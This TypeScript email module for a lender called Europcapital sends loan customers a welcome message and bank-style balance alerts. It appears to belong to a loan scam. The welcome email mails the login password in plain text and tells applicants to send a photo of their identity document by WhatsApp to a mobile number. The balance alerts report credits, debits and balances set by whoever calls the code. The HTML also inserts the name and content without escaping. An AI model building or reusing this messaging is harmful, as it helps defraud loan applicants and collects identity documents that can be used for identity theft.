/**
 * SERVICE EMAIL - EUROPCAPITAL (Version SMTP Hostinger)
 * 
 * Ce service envoie les données au fichier '/api/mail.php' sur votre serveur.
 * C'est ce fichier PHP qui utilisera vos identifiants SMTP Hostinger.
 */

const BRIDGE_URL = "/api/mail.php";

export const emailService = {
  async sendEmail(to: string, subject: string, htmlContent: string) {
    try {
      const response = await fetch(BRIDGE_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          to: [{ email: to }],
          subject: subject,
          html: `
            <div style="font-family: 'Inter', Arial, sans-serif; color: #1f2937; max-width: 600px; margin: auto; border: 1px solid #f3f4f6; border-radius: 20px; overflow: hidden; background-color: #ffffff;">
              <div style="background-color: #059669; padding: 40px; text-align: center;">
                <h1 style="color: white; margin: 0; font-size: 26px; font-weight: 800; letter-spacing: -0.025em;">EUROPCAPITAL</h1>
              </div>
              <div style="padding: 40px;">
                ${htmlContent}
                <div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #f3f4f6; text-align: center;">
                  <p style="font-size: 11px; color: #9ca3af; line-height: 1.5;">
                    <strong>Europcapital SAS</strong><br>
                    1 Place de la Bourse, 69002 Lyon, France<br>
                    Intermédiaire en Opérations de Banque - ORIAS n° 21950679
                  </p>
                </div>
              </div>
            </div>
          `
        })
      });
      return response.ok;
    } catch (error) {
      // On logue l'erreur mais on ne propage pas d'exception pour ne pas bloquer le dashboard
      console.warn("Service Email indisponible (le fichier /api/mail.php est-il présent sur le serveur ?)");
      return false;
    }
  },

  async sendWelcomeEmail(to: string, name: string, pass: string) {
    const html = `
      <h2 style="color: #059669; font-size: 22px; font-weight: 800;">Bienvenue chez Europcapital</h2>
      <p style="font-size: 16px; color: #4b5563;">Bonjour ${name}, votre demande de prêt a été enregistrée avec succès.</p>
      <div style="background-color: #f9fafb; padding: 25px; border-radius: 12px; margin: 25px 0; border: 1px solid #e5e7eb;">
        <p style="margin: 0 0 10px 0;"><strong>Identifiant :</strong> <span style="color: #059669;">${to}</span></p>
        <p style="margin: 0;"><strong>Mot de passe :</strong> <span style="color: #059669;">${pass}</span></p>
      </div>
      <p style="color: #065f46; font-weight: 700; background-color: #ecfdf5; padding: 15px; border-radius: 8px; text-align: center;">
        ⚠️ IMPORTANT : Envoyez une photo de votre pièce d'identité par WhatsApp au +33 7 54 09 50 27 pour valider votre identité.
      </p>
    `;
    return this.sendEmail(to, "Vos accès sécurisés - Europcapital", html);
  },

  async sendBalanceUpdate(to: string, name: string, amount: number, type: 'credit' | 'debit', newBalance: number) {
    const color = type === 'credit' ? '#059669' : '#dc2626';
    const html = `
      <h2 style="color: #111827; font-size: 20px; font-weight: 800;">Avis d'opération bancaire</h2>
      <p style="color: #4b5563;">Une nouvelle opération a été enregistrée sur votre compte.</p>
      <div style="padding: 25px; border-radius: 12px; background-color: #f9fafb; border-left: 6px solid ${color}; margin: 20px 0;">
        <p style="font-size: 24px; font-weight: 900; color: ${color}; margin: 0;">
          ${type === 'credit' ? '+' : '-'}${amount.toLocaleString()} €
        </p>
        <p style="margin: 10px 0 0 0; font-size: 14px; color: #6b7280;">Nouveau solde disponible : <strong>${newBalance.toLocaleString()} €</strong></p>
      </div>
      <p style="font-size: 14px; color: #9ca3af;">Connectez-vous à votre espace client pour plus de détails.</p>
    `;
    return this.sendEmail(to, `Alerte Mouvement : ${type === 'credit' ? 'Crédit' : 'Débit'} de ${amount}€`, html);
  }
};